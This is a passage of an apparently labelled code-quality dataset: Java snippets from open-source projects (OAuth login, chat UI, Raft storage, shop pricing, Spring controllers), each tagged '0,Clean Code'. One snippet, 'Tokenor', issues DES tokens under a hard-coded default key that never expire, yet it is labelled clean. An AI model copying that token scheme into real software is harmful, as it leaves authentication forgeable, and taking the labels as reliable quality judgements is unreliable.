    this.checkResponse(res.containsKey(""error""),res.get(""error_description""));
    return AuthToken.builder().accessToken(res.get(""access_token"")).scope(res.get(""scope"")).tokenType(res.get(""token_type"")).build();
  }
  @Override public AuthUser getUserInfo(  AuthToken authToken){
    HttpHeader header=new HttpHeader();
    header.add(""Authorization"",""token "" + authToken.getAccessToken());
    String response=new HttpUtils(config.getHttpConfig()).get(UrlBuilder.fromBaseUrl(source.userInfo()).build(),null,header,false).getBody();
    JSONObject object=JSONObject.parseObject(response);
    this.checkResponse(object.containsKey(""error""),object.getString(""error_description""));
    return AuthUser.builder().rawUserInfo(object).uuid(object.getString(""id"")).username(object.getString(""login"")).avatar(object.getString(""avatar_url"")).blog(object.getString(""blog"")).nickname(object.getString(""name"")).company(object.getString(""company"")).location(object.getString(""location"")).email(object.getString(""email"")).remark(object.getString(""bio"")).gender(AuthUserGender.UNKNOWN).token(authToken).source(source.toString()).build();
  }
  private void checkResponse(  boolean error,  String errorDescription){
    if (error) {
      throw new AuthException(errorDescription);
    }
  }
  /** 
 * 返回带 {@code state}参数的授权url，授权回调时会带上这个 {@code state}
 * @param state state 验证授权流程的参数，可以防止csrf
 * @return 返回授权地址
 */
  @Override public String authorize(  String state){
    return UrlBuilder.fromBaseUrl(super.authorize(state)).queryParam(""scope"",this.getScopes("" "",true,AuthScopeUtils.getDefaultScopes(AuthGithubScope.values()))).build();
  }
}
",0,Clean Code
"@ConversationInfoType(type=Conversation.ConversationType.Channel,line=0) @EnableContextMenu public class ChannelConversationViewHolder extends ConversationViewHolder {
  public ChannelConversationViewHolder(  Fragment fragment,  RecyclerView.Adapter adapter,  View itemView){
    super(fragment,adapter,itemView);
  }
  @Override protected void onBindConversationInfo(  ConversationInfo conversationInfo){
    ChannelInfo channelInfo=ChatManager.Instance().getChannelInfo(conversationInfo.conversation.target,false);
    String name;
    String portrait;
    if (channelInfo != null) {
      name=channelInfo.name;
      portrait=channelInfo.portrait;
    }
 else {
      name=""Channel<"" + conversationInfo.conversation.target + "">"";
      portrait=null;
    }
    nameTextView.setText(name);
    Glide.with(fragment).load(portrait).placeholder(R.mipmap.ic_channel).transforms(new CenterCrop(),new RoundedCorners(UIUtils.dip2Px(4))).into(portraitImageView);
  }
  @ConversationContextMenuItem(tag=ConversationContextMenuItemTags.TAG_UNSUBSCRIBE,confirm=true,priority=0) public void unSubscribeChannel(  View itemView,  ConversationInfo conversationInfo){
    conversationListViewModel.unSubscribeChannel(conversationInfo);
  }
  @Override public String contextMenuTitle(  Context context,  String tag){
    if (ConversationContextMenuItemTags.TAG_UNSUBSCRIBE.equals(tag)) {
      return ""取消收听"";
    }
    return super.contextMenuTitle(context,tag);
  }
  @Override public String contextConfirmPrompt(  Context context,  String tag){
    if (ConversationContextMenuItemTags.TAG_UNSUBSCRIBE.equals(tag)) {
      return ""确认取消订阅频道?"";
    }
    return super.contextConfirmPrompt(context,tag);
  }
}
",0,Clean Code
"/** 
 * @author jiachun.fjc
 */
public final class AsciiStringUtil {
  public static byte[] unsafeEncode(  final CharSequence in){
    final int len=in.length();
    final byte[] out=new byte[len];
    for (int i=0; i < len; i++) {
      out[i]=(byte)in.charAt(i);
    }
    return out;
  }
  public static String unsafeDecode(  final byte[] in,  final int offset,  final int len){
    final char[] out=new char[len];
    for (int i=0; i < len; i++) {
      out[i]=(char)(in[i + offset] & 0xFF);
    }
    return UnsafeUtil.moveToString(out);
  }
  public static String unsafeDecode(  final byte[] in){
    return unsafeDecode(in,0,in.length);
  }
  public static String unsafeDecode(  final ByteString in){
    final int len=in.size();
    final char[] out=new char[len];
    for (int i=0; i < len; i++) {
      out[i]=(char)(in.byteAt(i) & 0xFF);
    }
    return UnsafeUtil.moveToString(out);
  }
  private AsciiStringUtil(){
  }
}",0,Clean Code
"final class PreFillQueue {
  private final Map<PreFillType,Integer> bitmapsPerType;
  private final List<PreFillType> keyList;
  private int bitmapsRemaining;
  private int keyIndex;
  public PreFillQueue(  Map<PreFillType,Integer> bitmapsPerType){
    this.bitmapsPerType=bitmapsPerType;
    keyList=new ArrayList<PreFillType>(bitmapsPerType.keySet());
    for (    Integer count : bitmapsPerType.values()) {
      bitmapsRemaining+=count;
    }
  }
  public PreFillType remove(){
    PreFillType result=keyList.get(keyIndex);
    Integer countForResult=bitmapsPerType.get(result);
    if (countForResult == 1) {
      bitmapsPerType.remove(result);
      keyList.remove(keyIndex);
    }
 else {
      bitmapsPerType.put(result,countForResult - 1);
    }
    bitmapsRemaining--;
    keyIndex=keyList.isEmpty() ? 0 : (keyIndex + 1) % keyList.size();
    return result;
  }
  public int getSize(){
    return bitmapsRemaining;
  }
  public boolean isEmpty(){
    return bitmapsRemaining == 0;
  }
}
",0,Clean Code
"public interface ModifyUserSettingReqOrBuilder extends com.google.protobuf.MessageOrBuilder {
  /** 
 * <code>required int32 scope = 1;</code>
 */
  boolean hasScope();
  /** 
 * <code>required int32 scope = 1;</code>
 */
  int getScope();
  /** 
 * <code>required string key = 2;</code>
 */
  boolean hasKey();
  /** 
 * <code>required string key = 2;</code>
 */
  java.lang.String getKey();
  /** 
 * <code>required string key = 2;</code>
 */
  com.google.protobuf.ByteString getKeyBytes();
  /** 
 * <code>required string value = 3;</code>
 */
  boolean hasValue();
  /** 
 * <code>required string value = 3;</code>
 */
  java.lang.String getValue();
  /** 
 * <code>required string value = 3;</code>
 */
  com.google.protobuf.ByteString getValueBytes();
}
",0,Clean Code
"/** 
 * 缓存
 * @Author 1024创新实验室: 罗伊
 * @Date 2021/10/11 20:07
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@RestController @Tag(name=SwaggerTagConst.Support.CACHE) public class AdminCacheController extends SupportBaseController {
  @Resource private CacheService cacheService;
  @Operation(summary=""获取所有缓存 @author 罗伊"") @GetMapping(""/cache/names"") @SaCheckPermission(""support:cache:keys"") public ResponseDTO<List<String>> cacheNames(){
    return ResponseDTO.ok(cacheService.cacheNames());
  }
  @Operation(summary=""移除某个缓存 @author 罗伊"") @GetMapping(""/cache/remove/{cacheName}"") @SaCheckPermission(""support:cache:delete"") public ResponseDTO<String> removeCache(  @PathVariable String cacheName){
    cacheService.removeCache(cacheName);
    return ResponseDTO.ok();
  }
  @Operation(summary=""获取某个缓存的所有key @author 罗伊"") @GetMapping(""/cache/keys/{cacheName}"") @SaCheckPermission(""support:cache:keys"") public ResponseDTO<List<String>> cacheKeys(  @PathVariable String cacheName){
    return ResponseDTO.ok(cacheService.cacheKey(cacheName));
  }
}
/** 
 * 缓存
 * @Author 1024创新实验室: 罗伊
 * @Date 2021/10/11 20:07
 * @Wechat zhuoda1024
 * @Email lab1024@163.com
 * @Copyright  <a href=""https://1024lab.net"">1024创新实验室</a>
 */
@RestController @Tag(name=SwaggerTagConst.Support.CACHE) public class AdminCacheController extends SupportBaseController {
  @Resource private CacheService cacheService;
  @Operation(summary=""获取所有缓存 @author 罗伊"") @GetMapping(""/cache/names"") @SaCheckPermission(""support:cache:keys"") public ResponseDTO<List<String>> cacheNames(){
    return ResponseDTO.ok(cacheService.cacheNames());
  }
  @Operation(summary=""移除某个缓存 @author 罗伊"") @GetMapping(""/cache/remove/{cacheName}"") @SaCheckPermission(""support:cache:delete"") public ResponseDTO<String> removeCache(  @PathVariable String cacheName){
    cacheService.removeCache(cacheName);
    return ResponseDTO.ok();
  }
  @Operation(summary=""获取某个缓存的所有key @author 罗伊"") @GetMapping(""/cache/keys/{cacheName}"") @SaCheckPermission(""support:cache:keys"") public ResponseDTO<List<String>> cacheKeys(  @PathVariable String cacheName){
    return ResponseDTO.ok(cacheService.cacheKey(cacheName));
  }
}
",0,Clean Code
"/** 
 * @author AllDataDC
 * @date 2023-01-27
 */
@RestController @RequiredArgsConstructor @RequestMapping(""/api/logs"") @Api(tags=""系统：日志管理"") public class LogController {
  private final LogService logService;
  @Log(""导出数据"") @ApiOperation(""导出数据"") @GetMapping(value=""/download"") @PreAuthorize(""@el.check()"") public void exportLog(  HttpServletResponse response,  LogQueryCriteria criteria) throws IOException {
    criteria.setLogType(""INFO"");
    logService.download(logService.queryAll(criteria),response);
  }
  @Log(""导出错误数据"") @ApiOperation(""导出错误数据"") @GetMapping(value=""/error/download"") @PreAuthorize(""@el.check()"") public void exportErrorLog(  HttpServletResponse response,  LogQueryCriteria criteria) throws IOException {
    criteria.setLogType(""ERROR"");
    logService.download(logService.queryAll(criteria),response);
  }
  @GetMapping @ApiOperation(""日志查询"") @PreAuthorize(""@el.check()"") public ResponseEntity<Object> queryLog(  LogQueryCriteria criteria,  Pageable pageable){
    criteria.setLogType(""INFO"");
    return new ResponseEntity<>(logService.queryAll(criteria,pageable),HttpStatus.OK);
  }
  @GetMapping(value=""/user"") @ApiOperation(""用户日志查询"") public ResponseEntity<Object> queryUserLog(  LogQueryCriteria criteria,  Pageable pageable){
    criteria.setLogType(""INFO"");
    criteria.setUsername(SecurityUtils.getCurrentUsername());
    return new ResponseEntity<>(logService.queryAllByUser(criteria,pageable),HttpStatus.OK);
  }
  @GetMapping(value=""/error"") @ApiOperation(""错误日志查询"") @PreAuthorize(""@el.check()"") public ResponseEntity<Object> queryErrorLog(  LogQueryCriteria criteria,  Pageable pageable){
    criteria.setLogType(""ERROR"");
    return new ResponseEntity<>(logService.queryAll(criteria,pageable),HttpStatus.OK);
  }
  @GetMapping(value=""/error/{id}"") @ApiOperation(""日志异常详情查询"") @PreAuthorize(""@el.check()"") public ResponseEntity<Object> queryErrorLogDetail(  @PathVariable Long id){
    return new ResponseEntity<>(logService.findByErrDetail(id),HttpStatus.OK);
  }
  @DeleteMapping(value=""/del/error"") @Log(""删除所有ERROR日志"") @ApiOperation(""删除所有ERROR日志"") @PreAuthorize(""@el.check()"") public ResponseEntity<Object> delAllErrorLog(){
    logService.delAllByError();
    return new ResponseEntity<>(HttpStatus.OK);
  }
  @DeleteMapping(value=""/del/info"") @Log(""删除所有INFO日志"") @ApiOperation(""删除所有INFO日志"") @PreAuthorize(""@el.check()"") public ResponseEntity<Object> delAllInfoLog(){
    logService.delAllByInfo();
    return new ResponseEntity<>(HttpStatus.OK);
  }
}",0,Clean Code
"public class Rxs {
  public static final Consumer<Throwable> ON_ERROR_LOGGING=new Consumer<Throwable>(){
    @Override public void accept(    Throwable object) throws Exception {
      XLog.e(Log.getStackTraceString(object));
    }
  }
;
  public static final Action EMPTY_ACTION=new Action(){
    @Override public void run() throws Exception {
    }
  }
;
  public static final Consumer<Object> EMPTY_CONSUMER=new Consumer<Object>(){
    @Override public void accept(    Object o) throws Exception {
    }
  }
;
  public static Executor fromHandler(  Handler handler){
    return new HandlerExecutor(handler);
  }
@AllArgsConstructor private static class HandlerExecutor implements Executor {
    private Handler handler;
    @Override public void execute(    @NonNull Runnable runnable){
      handler.post(runnable);
    }
  }
public static class Executors {
    private static final Executor IO=java.util.concurrent.Executors.newCachedThreadPool();
    private Executors(){
    }
    public static Executor io(){
      return IO;
    }
  }
}
",0,Clean Code
"/** 
 * Keeps track of the average time series length and adjusts the probability per time point such that on average `num_instances` training examples are generated per time series.
 */
public class ExpectedNumInstanceSampler extends InstanceSampler {
  private double numInstances;
  private int totalLength;
  private int n;
  /** 
 * Construct a new instance of  {@code ExpectedNumInstanceSampler}.
 * @param axis the axis of the time series length
 * @param minPast minimal pastime length
 * @param minFuture minimal future time length
 * @param numInstances number of training examples generated per time series on average
 */
  public ExpectedNumInstanceSampler(  int axis,  int minPast,  int minFuture,  double numInstances){
    super(axis,minPast,minFuture);
    this.numInstances=numInstances;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public List<Integer> call(  NDArray ts){
    int[] bound=getBounds(ts);
    int windowSize=bound[1] - bound[0] + 1;
    if (windowSize <= 0) {
      return new ArrayList<>();
    }
    n+=1;
    totalLength+=windowSize;
    int avgLength=totalLength / n;
    if (avgLength <= 0) {
      return new ArrayList<>();
    }
    double prob=numInstances / avgLength;
    List<Integer> indices=new ArrayList<>();
    while (indices.isEmpty()) {
      for (int i=0; i < windowSize; i++) {
        if (RandomUtils.RANDOM.nextDouble() < prob) {
          indices.add(i + bound[0]);
        }
      }
    }
    return indices;
  }
}
",0,Clean Code
"/** 
 * A class for creating a load request that either loads an  {@link GifDrawable}directly or that adds an  {@link ResourceTranscoder} to transcode{@link GifDrawable} into another resource type.
 * @param < ModelType > The type of model to load the {@link GifDrawable} or othertranscoded class from.
 */
public class GifTypeRequest<ModelType> extends GifRequestBuilder<ModelType> {
  private final ModelLoader<ModelType,InputStream> streamModelLoader;
  private final RequestManager.OptionsApplier optionsApplier;
  private static <A,R>FixedLoadProvider<A,InputStream,GifDrawable,R> buildProvider(  Glide glide,  ModelLoader<A,InputStream> streamModelLoader,  Class<R> transcodeClass,  ResourceTranscoder<GifDrawable,R> transcoder){
    if (streamModelLoader == null) {
      return null;
    }
    if (transcoder == null) {
      transcoder=glide.buildTranscoder(GifDrawable.class,transcodeClass);
    }
    DataLoadProvider<InputStream,GifDrawable> dataLoadProvider=glide.buildDataProvider(InputStream.class,GifDrawable.class);
    return new FixedLoadProvider<A,InputStream,GifDrawable,R>(streamModelLoader,transcoder,dataLoadProvider);
  }
  GifTypeRequest(  GenericRequestBuilder<ModelType,?,?,?> other,  ModelLoader<ModelType,InputStream> streamModelLoader,  RequestManager.OptionsApplier optionsApplier){
    super(buildProvider(other.glide,streamModelLoader,GifDrawable.class,null),GifDrawable.class,other);
    this.streamModelLoader=streamModelLoader;
    this.optionsApplier=optionsApplier;
    crossFade();
  }
  /** 
 * Sets a transcoder to transcode the decoded  {@link GifDrawable} into anotherresource type.
 * @param transcoder The transcoder to use.
 * @param transcodeClass The {@link Class} of the resource the{@link GifDrawable} will be transcoded to.
 * @param < R > The type of the resource the {@link GifDrawable} will betrasncoded to.
 * @return This request builder.
 */
  public <R>GenericRequestBuilder<ModelType,InputStream,GifDrawable,R> transcode(  ResourceTranscoder<GifDrawable,R> transcoder,  Class<R> transcodeClass){
    FixedLoadProvider<ModelType,InputStream,GifDrawable,R> provider=buildProvider(glide,streamModelLoader,transcodeClass,transcoder);
    return optionsApplier.apply(new GenericRequestBuilder<ModelType,InputStream,GifDrawable,R>(provider,transcodeClass,this));
  }
  /** 
 * Setup the request to return the bytes of the loaded gif. <p> Note - Any transformations added during this load do not change the underlying bytes and therefore this will always load and provide the bytes of the original image before any transformations to the given target. </p>
 * @return A new Builder object to build a request to transform the given model into the bytes of an animated gif.
 */
  public GenericRequestBuilder<ModelType,InputStream,GifDrawable,byte[]> toBytes(){
    return transcode(new GifDrawableBytesTranscoder(),byte[].class);
  }
}
",0,Clean Code
"/** 
 * @author james mu
 * @date 19-8-9 下午16:50
 */
public class IntervalCount {
  private final LongAdder addr=new LongAdder();
  private final long intervalDurationMs;
  private volatile long startTime;
  private volatile long lastTickTime;
  public IntervalCount(  long intervalDurationMs){
    this.intervalDurationMs=intervalDurationMs;
    startTime=Clock.millis();
  }
  public long resetIfExpiredAndTick(){
    if (isExpired()) {
      reset();
    }
    tick();
    return addr.sum();
  }
  public long silenceDuration(){
    return Clock.millis() - lastTickTime;
  }
  public long getCount(){
    return addr.sum();
  }
  private void tick(){
    addr.add(1);
    lastTickTime=Clock.millis();
  }
  private void reset(){
    addr.reset();
    lastTickTime=Clock.millis();
  }
  private boolean isExpired(){
    return (Clock.millis() - startTime) > intervalDurationMs;
  }
}",0,Clean Code
"/** 
 * 交易详情，按需应该存入数据库，这里存入数据库，仅供临时测试
 * @author AllDataDC
 * @date 2023-01-27
 */
@Data public class TradeVo {
  /** 
 * （必填）商品描述 
 */
  @NotBlank private String body;
  /** 
 * （必填）商品名称 
 */
  @NotBlank private String subject;
  /** 
 * （必填）商户订单号，应该由后台生成 
 */
  @ApiModelProperty(hidden=true) private String outTradeNo;
  /** 
 * （必填）第三方订单号 
 */
  @ApiModelProperty(hidden=true) private String tradeNo;
  /** 
 * （必填）价格 
 */
  @NotBlank private String totalAmount;
  /** 
 * 订单状态,已支付，未支付，作废 
 */
  @ApiModelProperty(hidden=true) private String state;
  /** 
 * 创建时间，存入数据库时需要 
 */
  @ApiModelProperty(hidden=true) private Timestamp createTime;
  /** 
 * 作废时间，存入数据库时需要 
 */
  @ApiModelProperty(hidden=true) private Date cancelTime;
}",0,Clean Code
"/** 
 * Log entry storage service.
 * @author boyan (boyan@alibaba-inc.com)2018-Mar-12 3:43:54 PM
 */
public interface LogStorage extends Lifecycle<LogStorageOptions>, Storage {
  /** 
 * Returns first log index in log.
 */
  long getFirstLogIndex();
  /** 
 * Returns last log index in log.
 */
  long getLastLogIndex();
  /** 
 * Get logEntry by index.
 */
  LogEntry getEntry(  final long index);
  /** 
 * Get logEntry's term by index. This method is deprecated, you should use  {@link #getEntry(long)} to get the log id's term.
 * @deprecated
 */
  @Deprecated long getTerm(  final long index);
  /** 
 * Append entries to log.
 */
  boolean appendEntry(  final LogEntry entry);
  /** 
 * Append entries to log, return append success number.
 */
  int appendEntries(  final List<LogEntry> entries);
  /** 
 * Delete logs from storage's head, [first_log_index, first_index_kept) will be discarded.
 */
  boolean truncatePrefix(  final long firstIndexKept);
  /** 
 * Delete uncommitted logs from storage's tail, (last_index_kept, last_log_index] will be discarded.
 */
  boolean truncateSuffix(  final long lastIndexKept);
  /** 
 * Drop all the existing logs and reset next log index to |next_log_index|. This function is called after installing snapshot from leader.
 */
  boolean reset(  final long nextLogIndex);
}",0,Clean Code
"/** 
 * 查询客户端相关信息实现
 * @author lengleng
 * @date 2022/5/29
 */
@RequiredArgsConstructor public class PigRemoteRegisteredClientRepository implements RegisteredClientRepository {
  /** 
 * 刷新令牌有效期默认 30 天
 */
  private final static int refreshTokenValiditySeconds=60 * 60 * 24* 30;
  /** 
 * 请求令牌有效期默认 12 小时
 */
  private final static int accessTokenValiditySeconds=60 * 60 * 12;
  private final RemoteClientDetailsService clientDetailsService;
  /** 
 * Saves the registered client. <p> IMPORTANT: Sensitive information should be encoded externally from the implementation, e.g.  {@link RegisteredClient#getClientSecret()}
 * @param registeredClient the {@link RegisteredClient}
 */
  @Override public void save(  RegisteredClient registeredClient){
  }
  /** 
 * Returns the registered client identified by the provided  {@code id}, or {@code null} if not found.
 * @param id the registration identifier
 * @return the {@link RegisteredClient} if found, otherwise {@code null}
 */
  @Override public RegisteredClient findById(  String id){
    throw new UnsupportedOperationException();
  }
  /** 
 * 重写原生方法支持redis缓存
 * @param clientId
 * @return
 */
  @Override @SneakyThrows @Cacheable(value=CacheConstants.CLIENT_DETAILS_KEY,key=""#clientId"",unless=""#result == null"") public RegisteredClient findByClientId(  String clientId){
    SysOauthClientDetails clientDetails=RetOps.of(clientDetailsService.getClientDetailsById(clientId)).getData().orElseThrow(() -> new OAuth2AuthorizationCodeRequestAuthenticationException(new OAuth2Error(""客户端查询异常，请检查数据库链接""),null));
    RegisteredClient.Builder builder=RegisteredClient.withId(clientDetails.getClientId()).clientId(clientDetails.getClientId()).clientSecret(SecurityConstants.NOOP + clientDetails.getClientSecret()).clientAuthenticationMethod(ClientAuthenticationMethod.CLIENT_SECRET_BASIC);
    for (    String authorizedGrantType : clientDetails.getAuthorizedGrantTypes()) {
      builder.authorizationGrantType(new AuthorizationGrantType(authorizedGrantType));
    }
    Optional.ofNullable(clientDetails.getWebServerRedirectUri()).ifPresent(redirectUri -> Arrays.stream(redirectUri.split(StrUtil.COMMA)).filter(StrUtil::isNotBlank).forEach(builder::redirectUri));
    Optional.ofNullable(clientDetails.getScope()).ifPresent(scope -> Arrays.stream(scope.split(StrUtil.COMMA)).filter(StrUtil::isNotBlank).forEach(builder::scope));
    return builder.tokenSettings(TokenSettings.builder().accessTokenFormat(OAuth2TokenFormat.REFERENCE).accessTokenTimeToLive(Duration.ofSeconds(Optional.ofNullable(clientDetails.getAccessTokenValidity()).orElse(accessTokenValiditySeconds))).refreshTokenTimeToLive(Duration.ofSeconds(Optional.ofNullable(clientDetails.getRefreshTokenValidity()).orElse(refreshTokenValiditySeconds))).build()).clientSettings(ClientSettings.builder().requireAuthorizationConsent(!BooleanUtil.toBoolean(clientDetails.getAutoapprove())).build()).build();
  }
}
",0,Clean Code
"/** 
 * A traversal path representation of hops taken from a  {@link #getRootType() root} to the {@link #getLeafType() leaf}.
 */
public interface Path extends Iterable<PathElement> {
  /** 
 * The path starting point.
 * @return never {@literal null}.
 */
  Type getRootType();
  /** 
 * The leaf of the Path. Can be equal to the  {@link #getRootType() root} if the path does not have any {@link #depth()}.
 * @return never {@literal null}.
 */
  default Type getLeafType(){
    return getLeaf().getType();
  }
  /** 
 * The  {@link Path predecessor} of the {@link #getLeaf() leaf}.
 * @return {@literal null} in case of {@link #isRoot() root}.
 */
  Path getParent();
  /** 
 * Obtain the  {@link PathElement} holding more information about the leaf element.
 * @return never {@literal null}.
 */
  PathElement getLeaf();
  /** 
 * @return the path depth (levels). Zero if {@link #isRoot() root}.
 */
  int depth();
  /** 
 * Append a  {@link PathElement} to the current {@link Path}.
 * @param element must not be {@literal null}.
 * @return new instance of {@link Path}.
 */
  Path append(  PathElement element);
  /** 
 * @return {@literal true} if this is the starting point.
 */
  default boolean isRoot(){
    return depth() == 0;
  }
}
",0,Clean Code
"/** 
 * Constant values used throughout the GUI code.
 * @author DaPorkchop_
 */
@UtilityClass @SideOnly(Side.CLIENT) public class GuiConstants {
  /** 
 * The padding around all components (vertical and horizontal).
 */
  public static final int PADDING=2;
  /** 
 * The height of the title in a GUI header.
 */
  public static final int HEADER_TITLE_HEIGHT=30;
  public static final int FOOTER_HEIGHT=27;
  /** 
 * The width of a scrollbar.
 */
  public static final int SCROLLBAR_WIDTH=5;
  /** 
 * The maximum number of columns to use.
 */
  public static final int MAX_COLUMNS=2;
  /** 
 * The height of a button.
 */
  public static final int BUTTON_HEIGHT=20;
  public static final int BUTTON_INTERNAL_PADDING_HORIZONTAL=6;
}",0,Clean Code
"/** 
 * 积分商城的  {@link TradePriceCalculator} 实现类
 * @author owen
 */
@Component @Order(TradePriceCalculator.ORDER_POINT_ACTIVITY) @Slf4j public class TradePointActivityPriceCalculator implements TradePriceCalculator {
  @Resource private PointActivityApi pointActivityApi;
  @Resource private MemberUserApi memberUserApi;
  @Resource private TradeOrderQueryService tradeOrderQueryService;
  @Override public void calculate(  TradePriceCalculateReqBO param,  TradePriceCalculateRespBO result){
    if (ObjectUtil.notEqual(result.getType(),TradeOrderTypeEnum.POINT.getType())) {
      return;
    }
    MemberUserRespDTO user=memberUserApi.getUser(param.getUserId()).getCheckedData();
    result.setTotalPoint(user.getPoint()).setUsePoint(0);
    if (user.getPoint() == null || user.getPoint() <= 0) {
      return;
    }
    Assert.isTrue(param.getItems().size() == 1,""积分商城兑换商品时，只允许选择一个商品"");
    TradePriceCalculateRespBO.OrderItem orderItem=result.getItems().get(0);
    PointValidateJoinRespDTO activity=validateJoinPointActivity(param.getUserId(),param.getPointActivityId(),orderItem.getSkuId(),orderItem.getCount());
    Assert.isTrue(activity.getPoint() >= 1,""积分商城商品兑换积分必须大于 1"");
    int usePoint=activity.getPoint() * orderItem.getCount();
    result.setUsePoint(usePoint);
    orderItem.setUsePoint(usePoint);
    int discountPrice=orderItem.getPayPrice();
    if (activity.getPrice() != null && activity.getPrice() > 0) {
      discountPrice=orderItem.getPayPrice() - activity.getPrice() * orderItem.getCount();
    }
    TradePriceCalculatorHelper.addPromotion(result,orderItem,param.getPointActivityId(),""积分商城活动"",PromotionTypeEnum.POINT.getType(),StrUtil.format(""积分商城活动：省 {} 元"",TradePriceCalculatorHelper.formatPrice(discountPrice)),discountPrice);
    orderItem.setDiscountPrice(orderItem.getDiscountPrice() + discountPrice);
    TradePriceCalculatorHelper.recountPayPrice(orderItem);
    TradePriceCalculatorHelper.recountAllPrice(result);
  }
  private PointValidateJoinRespDTO validateJoinPointActivity(  Long userId,  Long activityId,  Long skuId,  Integer count){
    PointValidateJoinRespDTO pointValidateJoinRespDTO=pointActivityApi.validateJoinPointActivity(activityId,skuId,count).getCheckedData();
    int pointProductCount=tradeOrderQueryService.getActivityProductCount(userId,activityId,TradeOrderTypeEnum.POINT);
    if (pointProductCount + count > pointValidateJoinRespDTO.getCount()) {
      throw exception(PRICE_CALCULATE_POINT_TOTAL_LIMIT_COUNT);
    }
    return pointValidateJoinRespDTO;
  }
}
",0,Clean Code
"/** 
 * Implementation of  {@code CodeInput} that reads from a {@code short[]}. 
 */
public final class ShortArrayCodeInput extends BaseCodeCursor implements CodeInput {
  /** 
 * source array to read from 
 */
  private final short[] array;
  /** 
 * Constructs an instance. 
 */
  public ShortArrayCodeInput(  short[] array){
    if (array == null) {
      throw new NullPointerException(""array == null"");
    }
    this.array=array;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public boolean hasMore(){
    return cursor() < array.length;
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int read() throws EOFException {
    try {
      int value=array[cursor()];
      advance(1);
      return value & 0xffff;
    }
 catch (    ArrayIndexOutOfBoundsException ex) {
      throw new EOFException();
    }
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public int readInt() throws EOFException {
    int short0=read();
    int short1=read();
    return short0 | (short1 << 16);
  }
  /** 
 * {@inheritDoc} 
 */
  @Override public long readLong() throws EOFException {
    long short0=read();
    long short1=read();
    long short2=read();
    long short3=read();
    return short0 | (short1 << 16) | (short2 << 32)| (short3 << 48);
  }
}
",0,Clean Code
"/** 
 * 翻译
 * @author wangchao
 * @date 2019/11/25
 */
public interface Translator {
  /** 
 * 英译中
 * @param text 文本
 * @return {@link java.lang.String}
 */
  String en2Ch(  String text);
  /** 
 * 中译英
 * @param text 文本
 * @return {@link java.lang.String}
 */
  String ch2En(  String text);
  /** 
 * 初始化
 * @param config 配置
 * @return {@link Translator}
 */
  Translator init(  EasyDocConfig config);
  /** 
 * 获取配置
 * @return {@link EasyDocConfig}
 */
  EasyDocConfig getConfig();
  /** 
 * 清除缓存
 */
  void clearCache();
}",0,Clean Code
"public class Tokenor {
  private static String KEY=""testim"";
  private static long expiredTime=Long.MAX_VALUE;
  public static void setKey(  String key){
    if (!StringUtil.isNullOrEmpty(key)) {
      KEY=key;
    }
  }
  public static void setExpiredTime(  long expiredTime){
    Tokenor.expiredTime=expiredTime;
  }
  public static String getUserId(  byte[] password){
    try {
      String signKey=DES.decryptDES(new String(password));
      if (signKey.startsWith(KEY + ""|"")) {
        signKey=signKey.substring(KEY.length() + 1);
        long timestamp=Long.parseLong(signKey.substring(0,signKey.indexOf('|')));
        if (expiredTime > 0 && System.currentTimeMillis() - timestamp > expiredTime) {
          return null;
        }
        String id=signKey.substring(signKey.indexOf('|') + 1);
        return id;
      }
    }
 catch (    Exception e) {
    }
    return null;
  }
  public static String getToken(  String username){
    String signKey=KEY + ""|"" + (System.currentTimeMillis())+ ""|""+ username;
    try {
      return DES.encryptDES(signKey);
    }
 catch (    Exception e) {
      e.printStackTrace();
    }
    return null;
  }
}
",0,Clean Code
"public class StorageDeleteTask implements RenderTask {
  private final MapStorage storage;
  private final String mapId;
  private volatile double progress;
  private volatile boolean hasMoreWork;
  private volatile boolean cancelled;
  public StorageDeleteTask(  MapStorage storage,  String mapId){
    this.storage=Objects.requireNonNull(storage);
    this.mapId=Objects.requireNonNull(mapId);
    this.progress=0d;
    this.hasMoreWork=true;
    this.cancelled=false;
  }
  @Override public void doWork() throws Exception {
synchronized (this) {
      if (!this.hasMoreWork)       return;
      this.hasMoreWork=false;
    }
    if (this.cancelled)     return;
    storage.delete(progress -> {
      this.progress=progress;
      return !this.cancelled;
    }
);
  }
  @Override public boolean hasMoreWork(){
    return this.hasMoreWork && !this.cancelled;
  }
  @Override @DebugDump public double estimateProgress(){
    return this.progress;
  }
  @Override public void cancel(){
    this.cancelled=true;
  }
  @Override public boolean contains(  RenderTask task){
    if (task == this)     return true;
    if (task instanceof StorageDeleteTask) {
      StorageDeleteTask sTask=(StorageDeleteTask)task;
      return storage.equals(sTask.storage) && mapId.equals(sTask.mapId);
    }
    return false;
  }
  @Override public String getDescription(){
    return ""deleting map '%s'"".formatted(mapId);
  }
}
",0,Clean Code
"/** 
 * Generate the constants for Role 
 */
public static class Role {
  public static final String MEMBER=""member"";
  public static final String MASTER=""master"";
  public static final String ADMIN=""admin"";
  public static final String ADMIN_UPP=""ADMIN"";
  public static final String MEMBER_UPP=""MEMBER"";
  public static final String ROLE=""role"";
}
",0,Clean Code
"public interface FlinkEnvService extends IService<FlinkEnv> {
  /** 
 * Checks if a specific version of Flink exists.
 * @param version The version of Flink to check.
 * @return Returns enum value indicating the existence of the specified version.
 */
  FlinkEnvCheckEnum check(  FlinkEnv version);
  /** 
 * Create a new instance.
 * @param version The version of FlinkEnv to use.
 * @return true if the instance is successfully created, false otherwise.
 */
  boolean create(  FlinkEnv version);
  /** 
 * Deletes a Flink environment with the provided ID.
 * @param id the ID of the Flink environment to delete
 */
  void removeById(  Long id);
  /** 
 * Updates the specified version of Flink environment.
 * @param version the version of Flink environment to update
 */
  void update(  FlinkEnv version);
  /** 
 * Get flink version by application id.
 * @param appId the ID of the application
 * @return the FlinkEnv object representing the version of Flink associated with the given app ID
 */
  FlinkEnv getByAppId(  Long appId);
  /** 
 * Sets the specified Flink version as the default.
 * @param id The ID of the Flink version to set as the default.
 */
  void setDefault(  Long id);
  /** 
 * Retrieves the default version of FlinkEnv.
 * @return the default version of FlinkEnv
 */
  FlinkEnv getDefault();
  /** 
 * Retrieves a Flink environment by ID, if available. If the ID is null or not found, the method returns the default Flink environment.
 * @param id The ID of the Flink environment to retrieve. If null, the default environment will beretrieved.
 * @return The Flink environment with the specified ID, or the default environment if the ID isnull or not found.
 */
  FlinkEnv getByIdOrDefault(  Long id);
  /** 
